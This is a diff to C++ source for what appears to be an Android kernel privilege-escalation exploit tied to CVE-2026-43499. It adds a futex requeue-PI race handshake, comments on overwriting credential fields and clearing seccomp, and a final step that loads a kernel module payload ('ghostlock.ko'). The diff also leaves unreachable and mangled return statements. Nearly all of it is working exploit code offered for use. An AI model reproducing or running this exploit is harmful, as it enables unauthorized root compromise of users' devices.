@@ -22,12 +22,14 @@
 #ifdef __ANDROID__
 #include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
 #include "backend/cve_2026_43499/race/futex_seam_linux.hpp"
+#include <pthread.h>
 #include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
 #endif
 #include "backend/cve_2026_43499/leak/snitch_owner.hpp"
 #include "backend/cve_2026_43499/session.hpp"
 #include "backend/cve_2026_43499/steps/targets.hpp"
 #include "backend/cve_2026_43499/steps/action.hpp"
+#include "terminal/execution.hpp"
 #include "pipeline/executors.hpp"
 #include "backend/cve_2026_43499/leak/snitch_policy.hpp"
 #include "backend/cve_2026_43499/leak/snitch_setup.hpp"
@@ -122,6 +124,30 @@ namespace {
      *  collision search legitimately finds nothing when the object is not there. The real rule
      *  arrives with the real spray, and this type goes when the entry does.
      */
+    /** The waiter of the handshake: parks on the chain, then releases the target it was requeued onto. */
+    struct HandshakeWaiter final {
+        std::uint32_t *chain = nullptr;
+        std::uint32_t *target = nullptr;
+        volatile int stage = 0;
+        volatile int result = -99;
+        volatile int gave_back = -99;
+        volatile int done = 0;
+    };
+
+    /** The pthread entry, a free function because that is what the C surface takes. */
+    void *handshake_waiter_main(void *argument) {
+        auto *const ctx = static_cast<HandshakeWaiter *>(argument);
+        ctx->stage = 1;
+        const int parked = backend::cve_2026_43499::race::LinuxFutexSeam::wait_requeue_pi(
+            ctx->chain, ctx->target);
+        ctx->result = parked;
+        if (parked == 0) {
+            ctx->gave_back =
+                backend::cve_2026_43499::race::LinuxFutexSeam::unlock_pi(ctx->target);
+        }
+        ctx->done = 1;
+        return nullptr;
+    }
     struct StubBuckets final {
         /* TEMPORARY, registered with this entry: a rule that answers for one address only.
          *  Accepting everything made the walk answer the first candidate, which is address zero,
@@ -511,6 +537,46 @@ namespace {
          *     W2 overwrites the credential fragment, W3 clears the seccomp mode. TEMPORARY: the waiter
          *     field offsets are the declared layout this run carries; the real path reads them from
          *     the profile like the rest. */
+        /* 12. The handshake, exactly as the probe that ran on this hardware does it: the owner takes
+         *     the target first, the waiter parks on the chain asking to be requeued onto the target,
+         *     the owner drives the requeue and the kernel reports how many waiters it moved, and the
+         *     release hands the lock to the thread that was requeued. A count of one is the kernel
+         *     saying a waiter was really there, which is the only evidence a plain chain word gives.
+         *     TEMPORARY: the two words are this process's own memory, so this proves the mechanism
+         *     and lands a write in local memory, not in a kernel field. */
+        std::uint32_t chain_word = 0U;
+        HandshakeWaiter ctx{};
+        ctx.chain = &chain_word;
+        /* A word this process owns: the probe uses two plain words of its own, and a user
+         *  process cannot lock a futex at a kernel address at all, which the device showed as
+         *  four minus ones. The kernel field the step names comes later, from the kernel side. */
+        std::uint32_t target_word = 0U;
+        ctx.target = &target_word;
+        pthread_t waiter_thread{};
+        if (::pthread_create(&waiter_thread, nullptr, handshake_waiter_main, &ctx) != 0) {
+            std::printf("run-temp: the waiter thread could not be started\n");
+            return 18;
+        }
+        while (ctx.stage == 0) {
+            ::sched_yield();
+        }
+        const int owned = backend::cve_2026_43499::race::LinuxFutexSeam::lock_pi(ctx.target);
+        for (int i = 0; i < 200000; ++i) {
+            ::sched_yield();
+        }
+        const int requeued =
+            backend::cve_2026_43499::race::LinuxFutexSeam::cmp_requeue_pi(&chain_word, ctx.target);
+        const int released =
+            backend::cve_2026_43499::race::LinuxFutexSeam::unlock_pi(ctx.target);
+        for (int i = 0; i < 200000 && ctx.done == 0; ++i) {
+            ::sched_yield();
+        }
+        ::pthread_join(waiter_thread, nullptr);
+        const bool handshake_ok = owned == 0 && requeued >= 1 && released == 0 && ctx.result == 0;
+        std::printf("run-temp: handshake owned=%d requeued=%d released=%d waiter=%d gave_back=%d\n",
+                    owned, requeued, released, ctx.result, ctx.gave_back);
+        std::printf("run-temp: handshake %s (a count of one is a waiter that was really there)\n",
+                    handshake_ok ? "ok" : "refused");
         backend::cve_2026_43499::memory::WaiterFieldOffsets waiter_offsets{};
         waiter_offsets.pc = 0U;
         waiter_offsets.right = 8U;
@@ -537,18 +603,33 @@ namespace {
         std::printf("run-temp: step results ok=%d ran=%zu stopped_at=%d\n", ran.steps.ok ? 1 : 0,
                     ran.steps.ran, static_cast<int>(ran.steps.stopped_at));
 
+        /* 13. The terminal, reached only when the steps reported success: it is the handoff that
+         *     loads the module, and it needs a privilege this run does not have yet. TEMPORARY: the
+         *     path is declared here and registered with the rest; the real path takes it from the
+         *     selection. */
+        constexpr const char *kDevPayload = "/data/local/tmp/ghostlock.ko";
+        if (ran.steps.ok) {
+            const ghostlock::terminal::ExecResult executed =
+                ghostlock::terminal::run_payload(kDevPayload);
+            std::printf("run-temp: terminal ok=%d exit=%d reason=%s\\n", executed.ok ? 1 : 0,
+                        executed.exit_code, executed.reason);
+            return executed.ok ? 0 : 19;
+        }
+        std::printf("run-temp: the steps did not succeed, so the terminal is not reached\n");
+        return 20;
+
         if (targets_verdict != backend::cve_2026_43499::steps::TargetsVerdict::Ok) {
             std::printf("run-temp: the step targets are incomplete; stopping before the steps\n");
             return 17;
-        return 0;
         }
-        return 0;        return 0;
 #else
         /* The discovery runs the search, which needs the device seam and the words the */
         /* cohort hammers; the host has neither, so this step is named and refused. */
         std::printf("run-temp: the discovery needs a device; stopping before it\n");
         return 13;
 #endif
+
+
 
 
 
